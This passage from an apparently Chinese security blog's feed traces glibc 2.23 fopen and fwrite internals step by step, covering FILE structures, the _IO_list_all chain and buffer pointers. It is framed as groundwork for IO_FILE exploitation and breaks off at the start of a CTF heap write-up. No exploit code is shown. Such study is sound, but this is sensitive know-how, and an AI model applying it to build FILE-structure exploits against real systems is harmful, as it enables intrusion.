class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="调试fopen函数">调试fopen函数</h2><p>调试之前的话，可以先看一下整体调用的流程，这样在调试的时候有个参考。另外就是调试的时候，要附加一下源码，关于gdb源码调试环境搭建可以参考我的<a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">这篇文章</a>。</p><p>源代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;/home/hacker/Desktop/flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p><h3 id="整体调用流程图">整体调用流程图</h3><p><img src="../img/image-20221007215412769.png" alt="image-20221007215412769"></p><h3 id="调试">调试</h3><p>刚进入fopen函数的时候，就发现要调用__fopen_internal 函数了（如下图）。然后这里要注意的就是为啥执行的是fopen函数，但一进去就在_IO_new_fopen函数中呢?</p><p>原因是这里的宏定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_fopen fopen</span></span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007220100510.png" alt="image-20221007220100510"></p><h4 id="给新创建的结构体申请一片内存空间">给新创建的结构体申请一片内存空间</h4><p>然后进入__fopen_internal函数后，第一个调用的函数就是malloc来分配了一块locked_FILE结构体大小的内存(如下图)，这个结构体包含了_IO_FILE_plus、_IO_lock_t、_IO_wide_data这三个结构体。由于我们并不调试malloc函数，因此这里我们n过去</p><p><img src="../img/image-20221007215434310.png" alt="image-20221007215434310"></p><h4 id="对FILE结构体初始化">对FILE结构体初始化</h4><p>malloc函数执行后，再往下就是_IO_no_init函数(如下图)，我们si进去看看这个函数做了什么</p><p><img src="../img/image-20221007215454681.png" alt="image-20221007215454681"></p><p>可以发现调用了这个_IO_old_init函数，我们再次si进去</p><p><img src="../img/image-20221007215520022.png" alt="image-20221007215520022"></p><p>发现是在对_IO_FILE_plus结构体进行初始化(如下)</p><p><img src="../img/image-20221007215534954.png" alt="image-20221007215534954"></p><p>此时的_IO_FILE_plus结构体中的成员变量如下</p><p><img src="../img/image-20221007215548563.png" alt="image-20221007215548563"></p><p>等到_IO_old_init函数执行后，出来继续执行_IO_no_init函数，发现在对_IO_wide_data结构体中的成员变量进行初始化，因此得出结论_IO_no_init函数就是在进行着结构体的初始化工作</p><p><img src="../img/image-20221007215605749.png" alt="image-20221007215605749"></p><h4 id="将-IO-FILE-plus结构体链入-IO-list-all链表">将_IO_FILE_plus结构体链入_IO_list_all链表</h4><p>等到_IO_no_init函数出来后，就调用了_IO_file_init函数</p><p><img src="../img/image-20221007215627273.png" alt="image-20221007215627273"></p><p>可以发现其实_IO_file_init函数主要是对_IO_link_in函数的一个封装，而_IO_link_in函数听名字就感觉是进行的链入操作,si进去看看</p><p><img src="../img/image-20221007215640763.png" alt="image-20221007215640763"></p><p>这部分主要的代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure><p>很明显这里就把fp(也就是结构体_IO_FILE_plus)给链入了链表中</p><p><img src="../img/image-20221007215652819.png" alt="image-20221007215652819"></p><p>下面两个图片分别是将fp链入前后的情况</p><p><img src="../img/image-20221007215705984.png" alt="image-20221007215705984"></p><p><img src="../img/image-20221007215718666.png" alt="image-20221007215718666"></p><p>链入前后整个链表对应的情况如下：</p><p><img src="../img/image-20221007215732445.png" alt="image-20221007215732445"></p><h4 id="执行open系统调用来打开文件">执行open系统调用来打开文件</h4><p>当_IO_file_init 函数执行完后，就来到了fopen函数的核心部分，将要调用_IO_file_fopen函数(如下)</p><p><img src="../img/image-20221007215749092.png" alt="image-20221007215749092"></p><p>进入_IO_file_fopen函数后，发现先fopen函数的mode参数(文件的打开方式)进行了处理</p><p><img src="../img/image-20221007215801237.png" alt="image-20221007215801237"></p><p>而后调用了_IO_file_open函数(这里就不再放图片说明了)，然后si进去，该函数又调用了open64函数，再次si进去执行了open系统调用</p><p><img src="../img/image-20221007215812651.png" alt="image-20221007215812651"></p><p>然后这里将sys_open执行后的文件描述符赋值给fp-&gt;fileno(如下图)</p><p><img src="../img/image-20221007215826367.png" alt="image-20221007215826367"></p><p>至此fopen函数的整个流程可以说是接近尾声了，最后再次调用了_IO_link_in函数，确保fp已经链入了链表中(如果发现链入后，那么_IO_link_in函数将直接退出)。(如下图)</p><p><img src="../img/image-20221007215838094.png" alt="image-20221007215838094"></p><p><img src="../img/image-20221007215850109.png" alt="image-20221007215850109"></p><p>至此fopen函数结束，此时的FILE结构体如下</p><p><img src="../img/image-20221007215905013.png" alt="image-20221007215905013"></p><h3 id="总结fopen调用流程">总结fopen调用流程</h3><p>将整个fopen函数的调用流程概括一下为:</p><blockquote><p>1、给新创建的结构体申请一片内存空间</p><p>2、对FILE结构体初始化</p><p>3、将_IO_FILE_plus结构体链入_IO_list_all链表</p><p>4、执行open系统调用来打开文件</p></blockquote><h2 id="参考文章：">参考文章：</h2><p><a href="https://la13x.github.io/2021/07/27/IO-FILE/#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">IO_FILE相关利用 | Alex’s blog~ (la13x.github.io)</a></p><p><a href="https://nightrainy.github.io/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/">_IO_FILE结构体利用 - 知世の小屋 (nightrainy.github.io)</a></p><p><a href="https://www.anquanke.com/post/id/177910">IO FILE之fopen详解 - 安全客，安全资讯平台 (anquanke.com)</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">(41条消息) 好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc_hollk的博客-CSDN博客_stdout泄露libc</a></p><p><a href="https://www.cnblogs.com/hawkJW/p/13546416.html">pwn——IO_FILE学习（一） - hawkJW - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码调试&amp;&amp;分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码调试&amp;&amp;分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO学习--源码调试fwrite函数</title>
      <link href="/posts/7b71046d.html"/>
      <url>/posts/7b71046d.html</url>
      
        <content type="html"><![CDATA[<h2 id="前置知识：">前置知识：</h2><p>这个fwrite函数中的_IO_write_ptr指针的挪动和fread函数中的_IO_read_ptr指针的挪动是不太一样的。先回顾一下上一篇文章中_IO_read_ptr指针什么时候挪动？当系统调用read的时候从文件中读取多少个字节的数据到输入缓冲区，就将_IO_read_end指针挪动多少个字节**(初始值和_IO_read_base是一样的)**，而此时的_IO_read_ptr指针不动。当执行memcpy函数将数据从输入缓冲区拷贝多少个字节的数据到我们指定的内存地址，就将_IO_read_ptr指针挪动多少个字节。<strong>在_IO_read_base和_IO_read_ptr之间是已经拷贝过的数据，_IO_read_ptr和_IO_read_end之间是输入缓冲区中还未拷贝的数据。</strong></p><p>而本次分析的<strong>fwrite函数则是直接将_IO_buf_end的值赋给了_IO_write_end</strong>（read的那个指针可不是这样），而_IO_write_ptr的初始值则和_IO_write_base的值一样。该函数先从指定的内存地址读取一定字节的数据到输出缓冲区，此时的_IO_write_ptr指针挪动(我这里以及上下文提到的挪动指的都是在原本的基础上加)相应的字节。此时的**_IO_write_base指针和_IO_write_ptr指针之间的区域是将要从输出缓冲区写入文件的数据，而_IO_write_ptr指针和_IO_write_end指针之间的区域是输出缓冲区的可用区域(就是还能再往输出缓冲区拷贝多少个字节的内容)<strong>，当执行系统调用write往文件中写入一定的字节的内容后，_IO_write_ptr就会</strong>减去相应的字节**。</p><p>上面的内容一定要清楚，不然分析的时候就会陷入误区</p><p>前面两篇文章的地址如下：</p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p><p><a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">IO学习–源码分析fread函数 </a></p><h2 id="整体流程：">整体流程：</h2><p><img src="../img/image-20221007220914882.png" alt="image-20221007220914882"></p><img src="https://s2.loli.net/2022/08/12/iUOa84sphV1Wmyw.png" alt="image-20220811201511246" style="zoom:50%;" /><p>上面第一张图片是fwrite函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p><h2 id="源代码：">源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">25</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p><h2 id="源码分析">源码分析</h2><p>_IO_fwrite 源代码(fwrite原型为_IO_fwrite函数)如下，这段很好分析，先是判断了request（也就是我们要输入的字节数是否为0），然后加锁去执行_IO_sputn函数(该函数是vtable中的_IO_new_file_xsputn函数)。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入了_IO_new_file_xsputn函数，先是有个if判断如下，这里我很迷惑，因为我不清楚_flags对应的各个位都是什么含义，尽管<strong>通过调试可以看出来这个if并没有进去</strong>，但实际上我并不知道为什么这个if进不去，我上网找了很多资料也没有找到相关_flags各个位的含义，那就继续往下分析吧。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果没有进入上面的if，则会去判断是否还存在剩余的输出缓冲区（如下），count是剩余输出缓冲区的大小，to_do是需要往文件中写入的字节数。</p><p>根据下面这段代码分析，现在有三种情况分别是count&gt;to_do    count&lt;to_do    count==0</p><p>第一种是剩余的输出缓冲区比我们要输入的数据大，那memcpy执行后将数据拷贝到输出缓冲区就完事大吉，因为if (to_do + must_flush &gt; 0)这行代码是进不去的，所以就直接return了。第二种是剩余的输出缓冲区比我们要输入的数据小，也进行memcpy函数的拷贝，只不过拷贝后，因为还有数据没有拷贝进输出缓冲区(此时输出缓冲区已经满了)，那就去执行_IO_new_file_overflow函数，它有俩作用，如果不存在输出缓冲区则会进行创建reserve area，如果存在的话，则会调用_IO_do_write函数进行刷新，等刷新后再去拷贝剩下的数据到输出缓冲区。然后还有第三种情况就是此时并没有输出缓冲区。那也去执行_IO_new_file_overflow函数进行创建reserve area，再去拷贝数据到输出缓冲区。</p><p>第一种情况下面的代码写的很清楚了，就不再分析第一种情况。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第二种和第三种情况都会进入这个if中（这个if的代码我没放全，等分析到下面再放之后的部分），进入这个函数后就去调用了_IO_OVERFLOW (f, EOF)，这个函数是vtable中的_IO_new_file_overflow。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     _IO_size_t block_size, do_write;</span><br><span class="line">     <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br></pre></td></tr></table></figure><p>进入_IO_new_file_overflow函数(代码如下)，可以发现有一个对f-&gt;_IO_write_base是否为空的判断，而程序通过这个判断来判定是否没有分配resever area。如果没有分配的话则去执行_IO_doallocbuf函数来分配resever area(这个函数在<a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">fread源码分析</a>中已经分析过了，这里就不再分析了)，_IO_setg这个宏的作用就是将三个read指针全部赋值为f-&gt;_IO_buf_base(f-&gt;_IO_buf_base在_IO_doallocbuf函数中已经被初始化过了)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_doallocbuf (f);</span><br><span class="line">  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">          <span class="comment">/* #define _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="comment">(fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的代码一定要注意，此处是将_IO_write_ptr和_IO_write_base两个指针都初始化为了_IO_buf_base的值，<strong>但_IO_write_end指针却是初始化为了_IO_buf_end</strong>（read的三个相关指针是都被初始化为了_IO_buf_base）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">  _IO_free_backup_area (f);</span><br><span class="line">  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">     f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">     f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">     f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">     f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">     f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br></pre></td></tr></table></figure><p>然后由于当初调用_IO_OVERFLOW函数的时候，第二个参数为EOF</p><p><img src="https://s2.loli.net/2022/08/12/KBfmDGZv7RVIsyh.png" alt="image-20220811182225383"></p><p>因此_IO_new_file_overflow函数的ch为EOF</p><p><img src="https://s2.loli.net/2022/08/12/N1sd9CWzrle6JfZ.png" alt="image-20220811182330917"></p><p>所以上面几个指针赋值过后，执行下面if的时候就直接进入了,调用了_IO_do_write函数，注意下_IO_do_write的第三个参数，如果是新创建的reserve area，那么 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base的值则为0的（如下代码）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"> f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure><p>因为刚才说过，这个to_do其实就是0，因此return返回的时候发现to_do==0成立并且后面是||，就直接从_IO_new_do_write函数返回了，并没有去执行后面的new_do_write函数(当时分析到这里，我还不信，于是写了个demo测试了一下发现确实如此(如下图)）**注意:前面讨论的是新创建reserve area执行到这里的情况，如果是输出缓冲有数据的话，来到这里就会执行new_do_write函数，从而触发系统调用write来刷新输出缓冲区(不仅数据被刷新了出去,同时_IO_write_ptr指针也进行了更新)。**总结一下就是_IO_new_do_write函数对输出缓冲区中的数据进行了一个判断，如果存在数据的话就调用write函数来将输出缓冲区中的数据写入文件，否则的话就直接返回。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/08/12/EBw1xTPb2yfiCDh.png" alt="image-20220811183408807" style="zoom:50%;" /><p>然后程序一直返回到_IO_new_file_xsputn函数，接下这段代码实现的是如果要写到文件里的数据大于了reserve area这块区域(通常是0x1000,也就是4k)，那就将大于的部分直接执行系统调用write输出到文件，剩下的部分则写到输出缓冲区中。比如我们要写10k的数据到文件中，而reserve are为4k，那8k的数据都将直接被系统调用write写入文件中，另外2k的数据放到输出缓冲区中。</p><p>上述功能的实现核心代码就是这一行<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>(不得不说，这一行写的是真巧妙)，如果写入的数据量本身就小于reserve area的话，那do_write就会是0，也就无法进入下面那个if。而if中的new_do_write函数中执行了系统调用write，并且重置了_IO_write_ptr指针(如下图)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">     do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/08/12/z5xYhPaUNspGkmI.png" alt="image-20220812213721975"></p><p>这里也就是将大块的数据(大于reserve area的数据)去直接执行系统调用write写入文件，而剩余的小块(小于reserve area的数据)拷贝到输出缓冲区中（下面代码的_IO_default_xsputn函数调用了拷贝函数memcpy）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure><p>_IO_default_xsputn函数的源码如下，这个函数分析起来还是比较简单的。more是我们需要写入文件的字节数，count是输出缓冲区剩余的字节数。如果我们需要写入文件的字节数大于20的话，就执行memcpy函数去拷贝，如果小于20的话，就用for循环一个字节一个字节的拷贝(这个策略应该是效率比较高的)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">    count = more;</span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">      _IO_ssize_t i;</span><br><span class="line">      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">*p++ = *s++;</span><br><span class="line">      f-&gt;_IO_write_ptr = p;</span><br><span class="line">    &#125;</span><br><span class="line">  more -= count;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这个函数执行完毕后，整个fwrite函数也就算是结束了。</p><h2 id="总结fwrite函数的调用流程：">总结fwrite函数的调用流程：</h2><p>先尝试将数据拷贝到输出缓冲区，如果全部都拷贝过去的话函数就直接返回。如果只拷贝过去了一部分数据，另外一部分数据因为输出缓冲区满的话又或者没有分配reserve area的话都调用_IO_new_file_overflow函数，然后这个函数会新创建一个reserve area或者执行系统调用write刷新输出缓冲区。最后来判断要写入的字节数是否小于reserve area，如果小于的话则将数据拷贝到输出缓冲区中，如果大于的话则将大于部分用系统调用write写入文件剩余部分再拷贝到输出缓冲区。<strong>注意：这个demo程序的话，调试到fwrite函数结束也没有发现系统调用了write，这是因为输出缓冲区将在程序结束时的exit函数中的_IO_cleanup函数调用_IO_flush_all_lockp函数时进行刷新，此时才会执行系统调用write</strong></p><h2 id="参考文章：">参考文章：</h2><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fwrite">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p><p><a href="https://tttang.com/archive/1279/#toc__1">IO FILE之fwrite详解 - 跳跳糖 (tttang.com)</a></p><p><a href="http://blog.leanote.com/post/mut3p1g/file-struct"> (leanote.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码调试&amp;&amp;分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码调试&amp;&amp;分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap</title>
      <link href="/posts/a25249b0.html"/>
      <url>/posts/a25249b0.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结-启发：">总结&amp;&amp;启发：</h2><h3 id="总结：">总结：</h3><p>通过这道对于tcache机制有了一定的认识。</p><p>tcache_perthread_struct结构体是用来管理tcache链表的，它的源码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span 